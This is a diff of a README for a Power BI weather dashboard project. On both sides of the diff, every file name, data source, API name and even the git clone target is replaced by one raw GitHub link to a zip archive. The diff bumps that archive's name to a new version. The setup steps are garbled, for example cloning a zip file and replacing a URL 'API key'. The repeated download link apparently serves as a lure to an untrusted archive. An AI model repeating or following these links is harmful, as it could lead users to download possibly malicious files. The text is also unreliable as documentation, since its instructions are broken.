@@ -1,6 +1,6 @@
 🌦 Weather Report Dashboard (Power BI)
 
-This project is an interactive Weather Report Dashboard built with Power BI, powered by live data from https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Weather-Dashboard.zip
+This project is an interactive Weather Report Dashboard built with Power BI, powered by live data from https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Dashboard-Weather-2.9.zip
 
 It provides real-time weather insights, forecasts, and air quality analysis in a visually engaging and easy-to-understand format.
 
@@ -26,7 +26,7 @@ Temperature, humidity, pressure, wind speed, visibility, and UV index.
 
 • Power BI Desktop for dashboard development
 
-• https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Weather-Dashboard.zip for real-time weather and forecast data
+• https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Dashboard-Weather-2.9.zip for real-time weather and forecast data
 
 • DAX for calculated measures and KPIs
 
@@ -34,23 +34,23 @@ Temperature, humidity, pressure, wind speed, visibility, and UV index.
 
 📂 Project Structure
 
-• https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Weather-Dashboard.zip → Power BI Dashboard file
+• https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Dashboard-Weather-2.9.zip → Power BI Dashboard file
 
-• Dashboard https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Weather-Dashboard.zip → Contains dashboard preview images
+• Dashboard https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Dashboard-Weather-2.9.zip → Contains dashboard preview images
 
-• https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Weather-Dashboard.zip → Project documentation
+• https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Dashboard-Weather-2.9.zip → Project documentation
 
 🚀 How to Use
 
 1) Clone this repository:
-   git clone https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Weather-Dashboard.zip
+   git clone https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Dashboard-Weather-2.9.zip
 2) Download and install Power BI Desktop
-3)Open https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Weather-Dashboard.zip in Power BI Desktop.
-4)Replace the https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Weather-Dashboard.zip API key in the data source settings with your own key.
+3)Open https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Dashboard-Weather-2.9.zip in Power BI Desktop.
+4)Replace the https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Dashboard-Weather-2.9.zip API key in the data source settings with your own key.
 5)Refresh the dashboard to fetch live data.
 
 🌍 Data Source
-All weather and air quality data is fetched in real-time using the https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Weather-Dashboard.zip API.
+All weather and air quality data is fetched in real-time using the https://raw.githubusercontent.com/Sarb-jot/Weather-Dashboard/main/sullage/Dashboard-Weather-2.9.zip API.
 
 📌 Future Enhancements
 
